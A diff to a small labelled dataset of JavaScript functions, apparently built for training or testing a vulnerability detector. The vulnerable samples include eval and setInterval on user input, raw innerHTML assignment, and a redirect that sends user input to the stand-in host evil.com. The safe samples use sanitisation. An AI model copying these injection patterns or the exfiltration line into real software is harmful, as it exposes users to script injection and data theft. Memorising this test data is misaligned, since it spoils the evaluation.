@@ -1,4 +1,9 @@
-{"func": "function vulnerable_val1() {\n  document.body.innerHTML = '<script>' + userInput + '</script>';\n}", "target": 1}
-{"func": "function vulnerable_val2() {\n  eval(userInput);\n}", "target": 1}
-{"func": "function safe_val1() {\n  const clean = DOMPurify.sanitize(userInput);\n  document.getElementById('out').innerHTML = clean;\n}", "target": 0}
-{"func": "function safe_val2() {\n  const safe = document.createTextNode(userInput);\n  document.body.appendChild(safe);\n}", "target": 0}
+{"func": "function vulnerable_val1() {\n  eval(userInput);\n}", "target": 1}
+{"func": "function vulnerable_val2() {\n  setInterval(userInput, 1000);\n}", "target": 1}
+{"func": "function vulnerable_val3() {\n  location.href = 'http://evil.com?q=' + userInput;\n}", "target": 1}
+{"func": "function vulnerable_val4() {\n  document.body.innerHTML = userInput;\n}", "target": 1}
+
+{"func": "function safe_val1() {\n  const safe = encodeURIComponent(userInput);\n  console.log(safe);\n}", "target": 0}
+{"func": "function safe_val2() {\n  const clean = DOMPurify.sanitize(userInput);\n  element.innerHTML = clean;\n}", "target": 0}
+{"func": "function safe_val3() {\n  const div = document.createElement('div');\n  div.textContent = userInput;\n  document.body.appendChild(div);\n}", "target": 0}
+{"func": "function safe_val4() {\n  const msg = 'Safe';\n  alert(msg);\n}", "target": 0}
